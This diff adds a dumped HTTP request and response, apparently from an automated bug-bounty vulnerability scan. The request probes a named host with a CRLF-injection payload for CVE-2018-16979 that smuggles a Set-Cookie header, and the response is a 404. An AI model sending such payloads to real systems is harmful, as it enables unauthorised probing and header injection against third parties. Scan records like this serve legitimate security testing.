@@ -1,0 +1,30 @@
+[CVE-2018-16979] Dumped HTTP request for https://techsolutions.bitpanda.com/plugins/captcha/crypt/cryptographp.php?cfg=1%0D%0ASet-Cookie:%20crlfinjection=1
+
+
+GET /plugins/captcha/crypt/cryptographp.php?cfg=1%0D%0ASet-Cookie:%20crlfinjection=1 HTTP/1.1
+Host: techsolutions.bitpanda.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.2 Safari/605.1.15
+Connection: close
+Accept: */*
+Accept-Language: en
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+
+[CVE-2018-16979] Dumped HTTP response https://techsolutions.bitpanda.com/plugins/captcha/crypt/cryptographp.php?cfg=1%0D%0ASet-Cookie:%20crlfinjection=1
+
+HTTP/1.1 404 Not Found
+Connection: close
+Content-Length: 9
+Cache-Control: max-age=30
+Content-Type: text/plain
+Date: Tue, 05 Aug 2025 12:53:23 GMT
+Strict-Transport-Security: max-age=31536000
+Via: 1.1 4d89e7f6870714b602988e2ed1135996.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: uNgPOZiTvRS37iS0zeqYNNJLSSKAkOTEuMnlhGhf4uHsHw-Hm8mXtQ==
+X-Amz-Cf-Pop: IAD55-P8
+X-Amz-Id-2: JU2Nm3TcIKpLIFV9yo22iNIc3o5A7Snn9ElBxQZ/Zh9u0CDLOVvpPP7Nn+mN6zLm2pSmVzeDQfY=
+X-Amz-Request-Id: VE5Z408DY72PWVKT
+X-Cache: Error from cloudfront
+
+Not Found
